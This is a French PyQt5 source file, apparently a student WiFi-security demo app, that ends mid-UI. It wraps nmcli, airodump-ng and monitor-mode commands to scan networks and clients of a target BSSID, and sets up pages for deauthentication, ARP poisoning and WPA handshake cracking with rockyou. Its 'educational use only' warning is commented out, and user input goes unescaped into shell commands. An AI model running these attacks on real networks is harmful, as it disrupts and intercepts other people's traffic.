#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SÉCURITÉ RÉSEAU WIFI – Groupe 7
Application de démonstration : Attaques + Contre-mesures WiFi
"""

import sys
import os
import re
import subprocess
import signal
from datetime import datetime
from html import escape

# ── Dossier de l'application (même répertoire que ce fichier) ──
APP_DIR = os.path.dirname(os.path.abspath(__file__))

# ── Chemin rockyou.txt : Kali en priorité, sinon dossier local ──
_ROCKYOU_KALI  = "/usr/share/wordlists/rockyou.txt"
_ROCKYOU_LOCAL = os.path.join(APP_DIR, "rockyou.txt")
if os.path.exists(_ROCKYOU_KALI):
    DEFAULT_WORDLIST = _ROCKYOU_KALI
elif os.path.exists(_ROCKYOU_LOCAL):
    DEFAULT_WORDLIST = _ROCKYOU_LOCAL
else:
    DEFAULT_WORDLIST = _ROCKYOU_KALI   # valeur par défaut même si absent

# ── Fichier handshake.cap : même dossier que l'application ──
DEFAULT_CAP = os.path.join(APP_DIR, "handshake.cap")

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QTextEdit, QComboBox,
    QProgressBar, QGroupBox, QFormLayout, QTableWidget, QTableWidgetItem,
    QHeaderView, QTabWidget, QDialog, QSplitter, QFrame, QSpinBox,
    QScrollArea, QCheckBox, QStackedWidget
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QColor, QFont, QBrush


# ==================== COULEURS (même que Sujet 1) ====================
COLORS = {
    "bg": "#0f1117", "input": "#21262d", "border": "#30363d",
    "text": "#c9d1d9", "accent": "#58a6ff", "success": "#3fb950",
    "warning": "#f59e0b", "danger": "#ef4444", "orange": "#e67e22",
}


def stylesheet():
    return f"""
    QMainWindow, QWidget {{
        background-color: {COLORS['bg']};
        color: {COLORS['text']};
        font-family: "Segoe UI", sans-serif;
        font-size: 13px;
    }}
    QTabWidget::pane {{ border: 1px solid {COLORS['border']}; border-radius: 4px; }}
    QTabBar::tab {{
        background: {COLORS['input']}; color: {COLORS['text']};
        padding: 7px 16px; border: 1px solid {COLORS['border']};
        border-bottom: none; border-radius: 4px 4px 0 0;
    }}
    QTabBar::tab:selected {{ background: {COLORS['accent']}; color: white; font-weight: bold; }}
    QTextEdit {{
        background-color: #0d1117; border: 1px solid {COLORS['border']};
        border-radius: 6px; padding: 10px;
        font-family: 'Consolas', monospace; font-size: 12px;
    }}
    QLineEdit, QComboBox, QSpinBox {{
        background-color: {COLORS['input']}; color: {COLORS['text']};
        border: 1px solid {COLORS['border']}; border-radius: 6px; padding: 6px 10px;
    }}
    QPushButton {{
        background-color: #388bfd; color: white;
        border: none; border-radius: 6px;
        padding: 8px 14px; font-weight: 600;
    }}
    QPushButton:hover {{ background-color: {COLORS['accent']}; }}
    QPushButton:disabled {{ background-color: #30363d; color: #555; }}
    QGroupBox {{
        border: 1px solid {COLORS['border']}; border-radius: 6px;
        margin-top: 10px; padding-top: 8px;
    }}
    QGroupBox::title {{ color: {COLORS['accent']}; font-weight: bold; padding: 0 6px; }}
    QTableWidget {{
        background-color: {COLORS['input']};
        gridline-color: {COLORS['border']};
        border: 1px solid {COLORS['border']};
    }}
    QTableWidget::item {{ padding: 3px 6px; }}
    QHeaderView::section {{
        background-color: #1c2128; color: {COLORS['accent']};
        font-weight: bold; padding: 5px;
        border: 1px solid {COLORS['border']};
    }}
    QCheckBox {{ color: {COLORS['text']}; }}
    QProgressBar {{
        border: 1px solid {COLORS['border']}; border-radius: 3px;
        background: {COLORS['input']};
    }}
    QProgressBar::chunk {{ background: {COLORS['accent']}; border-radius: 3px; }}
    QSplitter::handle {{ background: {COLORS['border']}; }}
    QSplitter::handle:hover {{ background: {COLORS['accent']}; }}
    """


# ==================== THREAD COMMANDE ====================
class CmdThread(QThread):
    output   = pyqtSignal(str)
    finished = pyqtSignal(bool, str)

    def __init__(self, cmd):
        super().__init__()
        self.cmd = cmd
        self.raw_output = ""
        self._stop = False
        self.proc = None

    def run(self):
        self.output.emit(
            f"<span style='color:#58a6ff;'>[{datetime.now():%H:%M:%S}]</span> "
            f"<code>{escape(self.cmd)}</code><br>"
        )
        try:
            self.proc = subprocess.Popen(
                self.cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, preexec_fn=os.setsid
            )
            for line in iter(self.proc.stdout.readline, ''):
                if self._stop: break
                if line.strip():
                    self.raw_output += line
                    self.output.emit(line.rstrip() + "<br>")
            self.proc.wait()
            self.finished.emit(True, "Terminé")
        except Exception as e:
            self.finished.emit(False, str(e))

    def stop(self):
        self._stop = True
        if self.proc:
            try:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
            except Exception:
                self.proc.terminate()


# ==================== PARSEURS RÉSEAU (depuis Wifi_desktop.py) ====================
ANSI_RE = re.compile(
    r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]'
    r'|\x1B[PX^_].*?\x1B\\'
    r'|\x1B\][^\x07]*(?:\x07|\x1B\\)'
    r'|\x1B[@-Z\\-_]'
    r'|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]'
)
def strip_ansi(text: str) -> str:
    return ANSI_RE.sub('', text).rstrip()

# Snippet bash pour corriger NetworkManager si airmon-ng l'a tué
NM_FIX = r"""
NM_FIX_DONE=0
if iw dev wlan0mon info >/dev/null 2>&1; then
  echo "Mode moniteur détecté → arrêt wlan0mon…"
  sudo airmon-ng stop wlan0mon 2>&1 | grep -v "^$" || true
  NM_FIX_DONE=1
fi
if ! systemctl is-active --quiet NetworkManager; then
  echo "NetworkManager arrêté → redémarrage…"
  sudo systemctl restart NetworkManager
  sleep 3
  NM_FIX_DONE=1
fi
if nmcli dev show wlan0 2>/dev/null | grep -q "unmanaged"; then
  sudo nmcli device set wlan0 managed yes
  sleep 1
  NM_FIX_DONE=1
fi
if [ "$NM_FIX_DONE" = "1" ]; then echo "NetworkManager prêt"; fi
"""

def nm_fix_wrap(cmd: str) -> str:
    fix = NM_FIX.replace("'", "'\\''")
    return f"bash -c '{fix}\n{cmd}'"

def parse_nmcli_columns(output: str) -> list:
    """Parse nmcli dev wifi list — extrait SSID, BSSID, signal, sécurité, canal."""
    nets = []
    lines = [strip_ansi(l) for l in output.splitlines()]
    hdr_idx = -1
    for i, l in enumerate(lines):
        if "SSID" in l and "BSSID" in l:
            hdr_idx = i; break

    if hdr_idx >= 0:
        hdr = lines[hdr_idx]
        cols = {}
        for name in ["SSID","BSSID","SIGNAL","BARS","SECURITY","MODE","CHAN","RATE"]:
            idx = hdr.find(name)
            if idx >= 0: cols[name] = idx
        col_order = sorted(cols.items(), key=lambda x: x[1])
        for l in lines[hdr_idx+1:]:
            if not l.strip() or l.strip().startswith("--"): continue
            clean = l.lstrip("* ")
            fields = {}
            for j, (name, start) in enumerate(col_order):
                end = col_order[j+1][1] if j+1 < len(col_order) else len(clean)
                fields[name] = clean[start:end].strip() if start < len(clean) else ""
            ssid  = fields.get("SSID","").strip()
            bssid = fields.get("BSSID","").strip()
            sig   = fields.get("SIGNAL","").strip()
            sec   = fields.get("SECURITY","").strip()
            chan  = fields.get("CHAN","").strip()
            rate  = fields.get("RATE","").strip()
            if not ssid and not bssid: continue
            try: sig_int = int(sig)
            except: sig_int = 0
            nets.append({
                "ssid":     ssid or "<hidden>",
                "bssid":    bssid,
                "signal":   sig_int,
                "security": sec or "Open",
                "channel":  chan or "?",
                "rate":     rate or "?",
            })
        return nets

    # Format colon-separated
    for l in lines:
        l = l.strip()
        if not l or l.startswith("SSID"): continue
        tmp = l.replace("\\:", "\x00")
        parts = tmp.split(":")
        parts = [p.replace("\x00", ":") for p in parts]
        if len(parts) >= 4:
            ssid = parts[0].lstrip("* ")
            bssid = parts[1]
            sig = parts[2]
            sec = ":".join(parts[3:]).strip()
            try: sig_int = int(sig)
            except: sig_int = 0
            nets.append({
                "ssid": ssid or "<hidden>",
                "bssid": bssid,
                "signal": sig_int,
                "security": sec or "Open",
                "channel": "?",
            })
    return nets

def parse_airodump(output: str) -> list:
    """Parse airodump-ng output — extrait BSSID, canal, chiffrement."""
    nets = []
    lines = [strip_ansi(l) for l in output.splitlines()]
    in_ap = False
    for l in lines:
        l = l.strip()
        if "BSSID" in l and "PWR" in l and "Beacons" in l:
            in_ap = True; continue
        if "BSSID" in l and "STATION" in l:
            in_ap = False; continue
        if not in_ap or not l: continue
        parts = l.split()
        if len(parts) < 6: continue
        bssid = parts[0]
        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid): continue
        try:
            pwr = int(parts[1]); ch = parts[4]
            enc = parts[5] if len(parts) > 5 else "?"
            cipher = parts[6] if len(parts) > 6 else ""
            essid = " ".join(parts[10:]) if len(parts) > 10 else "<hidden>"
            nets.append({
                "ssid": essid, "bssid": bssid,
                "signal": abs(pwr), "channel": ch,
                "security": f"{enc} {cipher}".strip(),
                "rate": "?"
            })
        except Exception: continue
    return nets


# ==================== THREAD SCAN NMCLI ====================
class ScanThread(QThread):
    result = pyqtSignal(list)
    output = pyqtSignal(str)

    def __init__(self, cmd):
        super().__init__()
        self.cmd = cmd
        self._raw = ""

    def run(self):
        try:
            proc = subprocess.Popen(
                self.cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            for line in iter(proc.stdout.readline, ''):
                if line.strip():
                    self._raw += line
                    self.output.emit(strip_ansi(line).rstrip())
            proc.wait()
            # Tenter parse nmcli d'abord, sinon airodump
            nets = parse_nmcli_columns(self._raw)
            if not nets:
                nets = parse_airodump(self._raw)
            self.result.emit(nets)
        except Exception as e:
            self.output.emit(f"Erreur : {e}")
            self.result.emit([])


# ==================== ONGLET SCANNER ====================
class TabScanner(QWidget):
    networks_updated = pyqtSignal(list)   # émis quand réseaux disponibles

    def __init__(self):
        super().__init__()
        self.thread = None
        self._nets  = []
        self._build()

    def _build(self):
        lay = QVBoxLayout(self)
        lay.setContentsMargins(10, 10, 10, 10)

        hdr = QLabel("SCANNER DE RÉSEAUX WIFI")
        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['accent']};")
        lay.addWidget(hdr)

        desc = QLabel(
            "Méthode 1 (rapide, sans coupure réseau) : nmcli — scan via NetworkManager.\n"
            "Méthode 2 (furtif, mode moniteur) : airodump-ng — voir tous les réseaux passifs."
        )
        desc.setStyleSheet("color:#888; font-size:11px;")
        desc.setWordWrap(True)
        lay.addWidget(desc)

        # Configuration
        cfg = QGroupBox("Configuration")
        cfg_lay = QFormLayout(cfg)
        self.iface_edit = QLineEdit("wlan0")
        self.time_spin  = QSpinBox()
        self.time_spin.setRange(5, 60)
        self.time_spin.setValue(15)
        self.time_spin.setSuffix(" s")
        cfg_lay.addRow("Interface :", self.iface_edit)
        cfg_lay.addRow("Durée (airodump) :", self.time_spin)
        lay.addWidget(cfg)

        # Splitter terminal | tableau
        splitter = QSplitter(Qt.Vertical)
        splitter.setHandleWidth(6)

        self.terminal = QTextEdit()
        self.terminal.setReadOnly(True)
        self.terminal.setMaximumHeight(160)
        splitter.addWidget(self.terminal)

        tbl_box = QGroupBox("Réseaux détectés")
        tbl_lay = QVBoxLayout(tbl_box)
        self.table = QTableWidget(0, 6)
        self.table.setHorizontalHeaderLabels([
            "SSID", "BSSID", "Signal", "Sécurité", "Canal", "Action"
        ])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        for col, w in [(1,140),(2,70),(4,100),(5,80)]:
            self.table.setColumnWidth(col, w)
        self.table.setWordWrap(False)
        self.table.verticalHeader().setVisible(False)
        self.table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.table.setAlternatingRowColors(True)
        tbl_lay.addWidget(self.table)
        splitter.addWidget(tbl_box)

        splitter.setSizes([160, 500])
        lay.addWidget(splitter, stretch=1)

        self.status = QLabel("Prêt — utilisez les boutons en bas pour lancer le scan")
        self.status.setStyleSheet("color:#888; font-size:11px;")
        lay.addWidget(self.status)

    def log(self, txt):
        self.terminal.append(txt)

    def _set_busy(self, busy):
        self.status.setText("Scan en cours..." if busy else "Terminé")

    def scan_nmcli(self):
        """Scan rapide via nmcli — NE coupe PAS le réseau Kali."""
        self.table.setRowCount(0)
        self.terminal.clear()
        self._set_busy(True)
        self.log(f"<span style='color:{COLORS['success']};'>Scan nmcli — réseau Kali NON affecté...</span>")

        cmd = nm_fix_wrap(
            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1"
        )
        self.thread = ScanThread(cmd)
        self.thread.output.connect(self.log)
        self.thread.result.connect(self._load_results)
        self.thread.start()

    def enable_monitor(self):
        """Crée interface moniteur virtuelle sans couper wlan0."""
        iface = self.iface_edit.text().strip()
        self.log(
            f"<span style='color:{COLORS['warning']};'>"
            f"Création interface moniteur virtuelle mon0 (sans couper {iface})...</span>"
        )
        cmd = (
            f"sudo iw dev mon0 del 2>/dev/null; "
            f"sudo iw dev {iface} interface add mon0 type monitor && "
            f"sudo ip link set mon0 up && "
            f"echo 'Interface mon0 créée — WiFi Kali NON affecté'"
        )
        self.thread = CmdThread(cmd)
        self.thread.output.connect(self.log)
        self.thread.finished.connect(self._on_monitor_done)
        self.thread.start()

    def _on_monitor_done(self, ok, msg):
        if ok:
            self.log(f"<span style='color:{COLORS['success']};'>Interface mon0 active</span>")
            self.iface_edit.setText("mon0")
        else:
            self.log(f"<span style='color:{COLORS['danger']};'>Erreur moniteur : {msg}</span>")

    def scan_airodump(self):
        """Scan passif via airodump-ng sur interface moniteur."""
        iface = self.iface_edit.text().strip()
        secs  = self.time_spin.value()
        self.table.setRowCount(0)
        self.terminal.clear()
        self._set_busy(True)
        self.status.setText(f"Scan airodump-ng sur {iface} ({secs}s)...")

        cmd = (
            f"bash -c '"
            f"if iw dev {iface} info >/dev/null 2>&1; then "
            f"  echo \"Interface {iface} trouvée\"; "
            f"  sudo timeout {secs} airodump-ng {iface} 2>&1; "
            f"else "
            f"  echo \"Interface {iface} introuvable — cliquez Activer mode moniteur\"; "
            f"  iw dev 2>&1 | grep Interface; "
            f"fi'"
        )
        self.thread = ScanThread(cmd)
        self.thread.output.connect(self.log)
        self.thread.result.connect(self._load_results)
        self.thread.start()

    def restore_nm(self):
        """Restaure NetworkManager si airmon-ng l'avait tué."""
        self.log(f"<span style='color:{COLORS['success']};'>Restauration NetworkManager...</span>")
        cmd = (
            "bash -c '"
            "sudo iw dev mon0 del 2>/dev/null || true; "
            "sudo airmon-ng stop wlan0mon 2>/dev/null || true; "
            "sudo systemctl restart NetworkManager; sleep 3; "
            "sudo nmcli device set wlan0 managed yes 2>/dev/null || true; "
            "NM=$(systemctl is-active NetworkManager); echo \"NetworkManager: $NM\"; "
            "nmcli dev status 2>&1 | grep -E \"wlan|wifi\" || true'"
        )
        self.thread = CmdThread(cmd)
        self.thread.output.connect(self.log)
        self.thread.finished.connect(lambda ok, m:
            self.log(f"<span style='color:{COLORS['success']};'>NetworkManager restauré</span>"))
        self.thread.start()

    def stop_scan(self):
        if self.thread: self.thread.stop()
        self._set_busy(False)
        self.status.setText("Scan arrêté")

    def _load_results(self, nets):
        """Remplit le tableau avec les réseaux détectés."""
        self._set_busy(False)

        if not nets:
            self.status.setText("Aucun réseau détecté — vérifiez l'interface")
            self.log(f"<span style='color:{COLORS['warning']};'>Aucun réseau parsé.</span>")
            return

        self.table.setRowCount(len(nets))
        for i, n in enumerate(nets):
            sec = n.get("security", "Open")
            sig = n.get("signal", 0)
            chan = str(n.get("channel", "?"))

            # Signal en %
            sig_str = f"{sig}%" if isinstance(sig, int) and sig <= 100 else f"-{sig} dBm"

            # Canal + fréquence
            freq = ""
            if chan.isdigit():
                ch_n = int(chan)
                if ch_n <= 14:   freq = "2.4 GHz"
                elif ch_n <= 64: freq = "5 GHz"
                else:            freq = "5 GHz"
            chan_str = f"{chan}  {freq}" if freq else chan

            # Couleur sécurité
            sec_low = sec.lower()
            if not sec_low or "open" in sec_low:
                sec_col = COLORS['danger']
            elif "wep" in sec_low:
                sec_col = "#f59e0b"
            elif "wpa3" in sec_low:
                sec_col = COLORS['success']
            elif "wpa2" in sec_low:
                sec_col = "#3b82f6"
            else:
                sec_col = COLORS['warning']

            # Niveau risque
            if not sec_low or "open" in sec_low:
                risque = "ÉLEVÉ"
            elif "wep" in sec_low:
                risque = "CRITIQUE"
            elif "wpa3" in sec_low:
                risque = "Faible"
            else:
                risque = "Modéré"

            def it(txt, align=Qt.AlignLeft | Qt.AlignVCenter):
                item = QTableWidgetItem(str(txt))
                item.setTextAlignment(align)
                return item

            self.table.setItem(i, 0, it(n.get("ssid", "<hidden>")))
            self.table.setItem(i, 1, it(n.get("bssid", "?")))
            self.table.setItem(i, 2, it(sig_str, Qt.AlignCenter))

            sec_item = QTableWidgetItem(f"{sec}  [{risque}]")
            sec_item.setForeground(QColor(sec_col))
            sec_item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
            self.table.setItem(i, 3, sec_item)

            self.table.setItem(i, 4, it(chan_str, Qt.AlignCenter))

            # Bouton Sélectionner
            sel_btn = QPushButton("Sélect.")
            sel_btn.setStyleSheet(
                f"background:transparent; border:1px solid {COLORS['accent']};"
                f"color:{COLORS['accent']}; padding:2px 8px; border-radius:3px; font-size:10px;"
            )
            sel_btn.clicked.connect(lambda _, nw=n: self._select(nw))
            self.table.setCellWidget(i, 5, sel_btn)

        self.table.resizeRowsToContents()
        self._nets = nets
        self.status.setText(f"{len(nets)} réseaux détectés")
        self.log(
            f"<span style='color:{COLORS['success']};'>"
            f"✅ {len(nets)} réseaux chargés dans le tableau.</span>"
        )
        self.networks_updated.emit(nets)

    def _select(self, n):
        sec = n.get('security', '?')
        self.log(
            f"<span style='color:{COLORS['accent']};'>Sélectionné : "
            f"<b>{n.get('ssid','?')}</b>  |  BSSID: {n.get('bssid','?')}  |  "
            f"Sécu: {sec}  |  Canal: {n.get('channel','?')}  |  "
            f"Signal: {n.get('signal','?')}%</span>"
        )

    def get_nets(self):
        return self._nets


# ==================== ONGLET ATTAQUES ====================
class TabAttaques(QWidget):
    def __init__(self):
        super().__init__()
        self.thread = None
        self._build()

    def _scan_clients(self):
        """Scanne les clients connectés — affiche dans T1, navigue sur page WPA."""
        bssid = self.w_bssid.text().strip()
        iface = self.w_iface.text().strip()
        chan  = self.w_channel.text().strip()

        if not bssid or bssid == "XX:XX:XX:XX:XX:XX":
            self.w_status.setText("⚠ Sélectionnez d'abord un réseau cible depuis le Scanner")
            return

        # Naviguer sur la page WPA pour voir le Terminal 1
        self.show_page(2)

        # Vider T1 et afficher le scan
        self.w_t1.clear()
        self.w_t1.append(
            f"<span style='color:{COLORS['accent']};'>"
            f"🔍 Scan clients sur {bssid} — Canal:{chan} — Interface:{iface} (15s)...</span><br>"
        )
        self.w_status.setText("🔍 Scan clients en cours (15s)...")

        cmd = (
            f"bash -c '"
            f"if ! iw dev {iface} info >/dev/null 2>&1; then "
            f"  sudo iw dev wlan0 interface add mon0 type monitor 2>/dev/null; "
            f"  sudo ip link set mon0 up 2>/dev/null; "
            f"  IFACE=mon0; "
            f"else IFACE={iface}; fi; "
            f"sudo timeout 15 airodump-ng --bssid {bssid} -c {chan} $IFACE 2>&1'"
        )
        self._scan_client_thread = CmdThread(cmd)
        self._scan_client_thread.output.connect(self.w_t1.append)
        self._scan_client_thread.finished.connect(
            lambda ok, raw: self._parse_clients(raw)
        )
        self._scan_client_thread.start()

    def _parse_clients(self, raw):
        """Parse airodump-ng pour extraire les clients et remplir le combo."""
        import re as _re
        self.w_client_combo.clear()
        self.w_client_combo.addItem(
            "FF:FF:FF:FF:FF:FF  (tous les clients — broadcast)",
            "FF:FF:FF:FF:FF:FF"
        )
        bssid = self.w_bssid.text().strip()
        count = 0
        in_station = False
        for line in strip_ansi(raw).splitlines():
            if "STATION" in line and "BSSID" in line:
                in_station = True; continue
            if not in_station: continue
            parts = line.split()
            if len(parts) >= 2:
                ap_mac   = parts[0].strip()
                sta_mac  = parts[1].strip()
                if not _re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', ap_mac):
                    continue
                if not _re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', sta_mac):
                    continue
                # Afficher dans T1
                self.w_t1.append(
                    f"<span style='color:{COLORS['success']};'>"
                    f"✅ Client : {sta_mac}  (connecté à {ap_mac})</span>"
                )
                self.w_client_combo.addItem(
                    f"{sta_mac}  ← client connecté",
                    sta_mac
                )
                count += 1
        msg = (f"✅ {count} client(s) détecté(s) — sélectionnez dans la liste"
               if count else "⚠ Aucun client détecté — vérifiez BSSID/canal/interface")
        self.w_status.setText(msg)
        self.w_t1.append(
            f"<span style='color:{COLORS['accent']};'><br>{msg}</span>"
        )

    def update_networks(self, nets):
        """Appelé quand le scanner détecte de nouveaux réseaux."""
        self.net_combo.clear()
        self.net_combo.addItem("— Sélectionner un réseau cible depuis le scan —")
        for n in nets:
            ssid  = n.get("ssid", "<hidden>")
            bssid = n.get("bssid", "?")
            sec   = n.get("security", "?")
            chan  = str(n.get("channel", "?"))
            self.net_combo.addItem(f"{ssid}  |  {bssid}  |  {sec}  |  Ch:{chan}", n)

    def _on_net_selected(self, idx):
        """Auto-rempli les champs avec le réseau sélectionné."""
        if idx <= 0: return
        n = self.net_combo.itemData(idx)
        if not n: return
        bssid = n.get("bssid", "")
        chan  = str(n.get("channel", "6"))
        ssid  = n.get("ssid", "")
        # Remplir Deauth
        self.d_bssid.setText(bssid)
        # Remplir WPA
        self.w_bssid.setText(bssid)
        self.w_channel.setText(chan)
        # Remplir Dictionnaire
        self.di_bssid.setText(bssid)
        self.di_ssid.setText(ssid)

    def _build(self):
        lay = QVBoxLayout(self)
        lay.setContentsMargins(10, 10, 10, 10)

        hdr = QLabel("SIMULATION D'ATTAQUES WIFI")
        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['danger']};")
        lay.addWidget(hdr)
        """
        warn = QLabel(
            "⚠️  Usage éducatif uniquement — sur vos propres équipements en environnement de test."
        )
        warn.setStyleSheet(f"color:{COLORS['warning']}; font-size:11px; font-weight:bold;")
        lay.addWidget(warn)
        """
        # ── Sélecteur réseau cible (depuis scan) ──
        net_box = QGroupBox("Réseau cible — sélectionner depuis le scan WiFi")
        net_lay = QHBoxLayout(net_box)
        self.net_combo = QComboBox()
        self.net_combo.addItem("— Lancez d'abord le Scanner WiFi puis sélectionnez —")
        self.net_combo.setSizePolicy(
            self.net_combo.sizePolicy().horizontalPolicy(),
            self.net_combo.sizePolicy().verticalPolicy()
        )
        self.net_combo.currentIndexChanged.connect(self._on_net_selected)
        net_lay.addWidget(self.net_combo, stretch=1)
        lay.addWidget(net_box)

        # ── QStackedWidget pour sous-pages ──
        self.stack = QStackedWidget()

        # ── Page 0 : Deauth ──
        deauth_w = QWidget()
        d_lay = QVBoxLayout(deauth_w)
        d_desc = QLabel(
            "Attaque de désauthentification (Deauth)\n"
            "Envoie des trames 802.11 qui forcent les clients à se déconnecter du point d'accès.\n"
            "But : démontrer la vulnérabilité des réseaux sans 802.11w (MFP)."
        )
        d_desc.setWordWrap(True)
        d_desc.setStyleSheet("color:#888; font-size:11px;")
        d_lay.addWidget(d_desc)

        d_cfg = QGroupBox("Paramètres")
        d_form = QFormLayout(d_cfg)
        self.d_iface  = QLineEdit("wlan0mon")
        self.d_bssid  = QLineEdit("XX:XX:XX:XX:XX:XX")
        self.d_client = QLineEdit("FF:FF:FF:FF:FF:FF")
        self.d_count  = QSpinBox()
        self.d_count.setRange(0, 1000); self.d_count.setValue(10)
        self.d_count.setSpecialValueText("Continu (0)")
        d_form.addRow("Interface (monitor) :", self.d_iface)
        d_form.addRow("BSSID cible (AP) :", self.d_bssid)
        d_form.addRow("Client MAC (FF=tous) :", self.d_client)
        d_form.addRow("Nombre de paquets :", self.d_count)
        d_lay.addWidget(d_cfg)

        self.d_cmd_preview = QLabel()
        self.d_cmd_preview.setStyleSheet(
            "background:#161b22; border:1px solid #30363d; border-radius:4px;"
            "padding:6px 10px; font-family:Consolas; color:#c9d1d9; font-size:11px;"
        )
        self.d_cmd_preview.setWordWrap(True)
        d_lay.addWidget(self.d_cmd_preview)

        self.d_terminal = QTextEdit(); self.d_terminal.setReadOnly(True)
        d_lay.addWidget(self.d_terminal, stretch=1)
        self.stack.addWidget(deauth_w)

        # ── Page 1 : ARP Poisoning ──
        arp_w = QWidget()
        a_lay = QVBoxLayout(arp_w)
        a_desc = QLabel(
            "Attaque ARP Poisoning (Man-in-the-Middle)\n"
            "Empoisonne les tables ARP du client et du routeur pour intercepter tout le trafic.\n"
            "But : démontrer l'interception de données sur réseau non chiffré."
        )
        a_desc.setWordWrap(True)
        a_desc.setStyleSheet("color:#888; font-size:11px;")
        a_lay.addWidget(a_desc)

        a_cfg = QGroupBox("Paramètres")
        a_form = QFormLayout(a_cfg)
        self.a_iface  = QLineEdit("wlan0")
        self.a_target = QLineEdit("192.168.1.X")
        self.a_router = QLineEdit("192.168.1.1")
        a_form.addRow("Interface :", self.a_iface)
        a_form.addRow("IP cible (victime) :", self.a_target)
        a_form.addRow("IP routeur (gateway) :", self.a_router)
        a_lay.addWidget(a_cfg)

        self.a_terminal = QTextEdit(); self.a_terminal.setReadOnly(True)
        a_lay.addWidget(self.a_terminal, stretch=1)
        self.stack.addWidget(arp_w)

        # ── Page 2 : WPA Handshake ──
        wpa_w = QWidget()
        w_lay = QVBoxLayout(wpa_w)
        w_lay.setContentsMargins(6, 6, 6, 6)
        w_lay.setSpacing(0)

        # ── Splitter VERTICAL : config (haut) ↕ terminaux (bas) ──
        w_vsplit = QSplitter(Qt.Vertical)
        w_vsplit.setHandleWidth(6)
        w_vsplit.setStyleSheet(
            f"QSplitter::handle:vertical {{"
            f"  background: {COLORS['border']}; height: 6px; }}"
            f"QSplitter::handle:vertical:hover {{"
            f"  background: {COLORS['accent']}; }}"
        )

        # ── Partie haute : config ──
        w_top = QWidget()
        w_top_lay = QVBoxLayout(w_top)
        w_top_lay.setContentsMargins(0, 2, 0, 2)
        w_top_lay.setSpacing(4)

        # Instructions supprimées — remplacées par statut compact
        w_cfg = QGroupBox("Paramètres")
        w_form = QFormLayout(w_cfg)
        self.w_iface   = QLineEdit("wlan0mon")
        self.w_bssid   = QLineEdit("XX:XX:XX:XX:XX:XX")
        self.w_channel = QLineEdit("6")
        self.w_wordlist= QLineEdit(DEFAULT_WORDLIST)

        # ── Sélecteur client connecté (BSSID client) ──
        client_row = QWidget()
        cl_lay = QHBoxLayout(client_row)
        cl_lay.setContentsMargins(0, 0, 0, 0); cl_lay.setSpacing(6)
        self.w_client_combo = QComboBox()
        self.w_client_combo.addItem("FF:FF:FF:FF:FF:FF  (tous les clients — broadcast)")
        self.w_client_combo.setToolTip(
            "Sélectionner un client spécifique pour le deauth ciblé.\n"
            "FF:FF:FF:FF:FF:FF = déconnecter TOUS les clients."
        )
        cl_lay.addWidget(self.w_client_combo, stretch=1)
        btn_scan_clients = QPushButton("🔍")
        btn_scan_clients.setFixedSize(34, 30)
        btn_scan_clients.setToolTip("Détecter les clients connectés au BSSID cible")
        btn_scan_clients.setStyleSheet(
            f"background:{COLORS['input']}; border:1px solid {COLORS['border']};"
            f"border-radius:4px; color:{COLORS['warning']}; font-size:14px;"
        )
        btn_scan_clients.clicked.connect(self._scan_clients)
        cl_lay.addWidget(btn_scan_clients)

        # ── Sélecteur fichier .cap existant ──
        cap_sel_row = QWidget()
        cap_sel_lay = QHBoxLayout(cap_sel_row)
        cap_sel_lay.setContentsMargins(0, 0, 0, 0); cap_sel_lay.setSpacing(6)
        self.w_cap_combo = QComboBox()
        self.w_cap_combo.addItem("— Nouveau fichier (créé automatiquement) —", None)
        self.w_cap_combo.setToolTip("Sélectionner un .cap existant pour crack direct")
        cap_sel_lay.addWidget(self.w_cap_combo, stretch=1)
        btn_refresh = QPushButton("🔄")
        btn_refresh.setFixedSize(34, 30)
        btn_refresh.setToolTip("Rafraîchir la liste des .cap")
        btn_refresh.setStyleSheet(
            f"background:{COLORS['input']}; border:1px solid {COLORS['border']};"
            f"border-radius:4px; color:{COLORS['accent']}; font-size:14px;"
        )
        btn_refresh.clicked.connect(self._refresh_cap_list)
        cap_sel_lay.addWidget(btn_refresh)

        w_form.addRow("Interface (monitor) :", self.w_iface)
        w_form.addRow("BSSID réseau cible :", self.w_bssid)
        w_form.addRow("Canal :", self.w_channel)
        w_form.addRow("Client connecté :", client_row)
        w_form.addRow("Wordlist :", self.w_wordlist)
        w_form.addRow("Fichier .cap existant :", cap_sel_row)
        w_top_lay.addWidget(w_cfg)

        # ── Boîte résultat vérification handshake (étape 5) ──
        verif_box = QGroupBox("Étape 5 — Résultat vérification handshake")
        verif_box.setStyleSheet(
            f"QGroupBox {{ border:1px solid {COLORS['success']}; border-radius:4px; "
            f"margin-top:10px; padding-top:6px; }}"
            f"QGroupBox::title {{ color:{COLORS['success']}; font-weight:bold; padding:0 6px; }}"
        )
        verif_lay = QVBoxLayout(verif_box)
        verif_lay.setContentsMargins(6, 4, 6, 6)
        self.w_verif_result = QTextEdit()
        self.w_verif_result.setReadOnly(True)
        self.w_verif_result.setMaximumHeight(60)
        self.w_verif_result.setPlaceholderText(
            "Résultat vérification handshake...\n"
            "Exemple :  1  94:0E:6B:88:BE:7F  manda  WPA (1 handshake)"
        )
        self.w_verif_result.setStyleSheet(
            "background:#0d1117; color:#3fb950; "
            "font-family:Consolas,monospace; font-size:11px; "
            "border:none;"
        )
        verif_lay.addWidget(self.w_verif_result)
